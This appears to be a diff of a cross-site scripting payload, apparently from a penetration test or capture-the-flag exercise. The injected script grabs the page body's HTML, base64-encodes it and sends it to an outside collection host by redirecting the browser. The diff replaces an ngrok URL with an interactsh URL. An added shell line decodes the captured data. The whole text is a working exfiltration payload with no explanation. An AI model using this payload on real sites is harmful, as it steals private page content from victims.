@@ -1,4 +1,6 @@
 <script>
 var exfil = document.getElementsByTagName("body")[0].innerHTML;
-window.location.href="https://c3d9707d386e.ngrok.io?pgsrc=" + btoa(exfil);
+window.location.href=" https://app.interactsh.com/#/ " + btoa(exfil);
 </script>
+
+echo "CgogIDxuYXYgY2xhc3M9Im5hdmJhci..." | base64 -d
